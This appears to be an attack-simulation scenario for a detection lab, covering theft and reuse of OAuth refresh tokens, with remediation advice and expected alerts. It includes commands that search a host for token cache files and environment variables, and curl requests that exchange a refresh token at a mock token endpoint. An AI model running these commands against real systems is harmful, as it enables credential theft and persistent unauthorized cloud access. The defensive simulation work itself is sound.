name: Stolen Refresh Token for Persistent Access
description: Attacker steals an OAuth refresh token from a compromised workload and uses it for persistent access to cloud resources without re-authentication, surviving access token expiration
real_world_relevance: Storm-0558 used stolen signing keys to forge tokens, Golden SAML attacks (SolarWinds), refresh token theft from .azure/msal_token_cache.json and browser credential stores

attack_flow.description: Attacker discovers a refresh token in a configuration file or process environment, then uses it to obtain fresh access tokens for persistent cloud access
diagram: 1. Attacker gains access to workload with cached OAuth tokens
2. Discover refresh token in config files or environment variables
3. Use refresh token to request new access token from token endpoint
4. Access cloud resources with the fresh access token
5. Repeat token refresh to maintain persistent access across rotations

phases.name: Refresh Token Discovery
phases.description: Search for cached OAuth refresh tokens on the compromised workload

actions.command: find / -maxdepth 4 -name 'msal_token_cache*' -o -name '.azure' -o -name 'token_cache*' -o -name 'refresh_token*' 2>/dev/null | head -10 || echo 'No token caches found'
actions.description: Search for Azure MSAL and generic OAuth token cache files

actions.command: env | grep -iE 'REFRESH_TOKEN|OAUTH_TOKEN|AZURE_TOKEN' || echo 'No refresh tokens in environment'
actions.description: Check environment variables for cached refresh tokens

phases.name: Refresh Token Exploitation
phases.description: Use the stolen refresh token to obtain a new access token

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=refresh_token&refresh_token=0.ARoAv4j5cvGGr0GRqy180BHbR_fake_refresh_token_demo_value&client_id=legitimate-app-001&scope=https://graph.microsoft.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Refresh token exchange failed'
actions.description: Exchange stolen refresh token for new access token

phases.name: Resource Access
phases.description: Use the fresh access token to access cloud resources

actions.command: curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{"grant_type":"refresh_token","refresh_token":"0.ARoAv4j5cvGGr0GRqy180BHbR_fake_refresh_token","scope":"openid profile email"}' 2>/dev/null | python3 -m json.tool || echo 'Token refresh failed'
actions.description: Demonstrate persistence by refreshing the access token again

phases.name: Persistence Demonstration
phases.description: Show that refresh tokens survive access token expiration

actions.command: echo '[SIMULATED] Access token expired. Using refresh token to obtain new access token without re-authentication. Attacker maintains persistent access.'
actions.description: Demonstrate refresh token persistence across token rotation

indicators_of_compromise.description: OAuth refresh token used from new location or IP

expected_wazuh_alerts.description: NHI: OAuth refresh token used from new location/IP

immediate: Revoke all refresh tokens for the compromised service principal
Investigate sign-in logs for anomalous refresh token usage
long_term: Implement Continuous Access Evaluation (CAE) to detect token misuse
Use short-lived refresh tokens with sliding window expiration
Store tokens in secure enclaves rather than filesystem
Monitor for refresh token usage from unexpected IPs or geolocations

references.title: MITRE ATT&CK T1528 - Steal Application Access Token
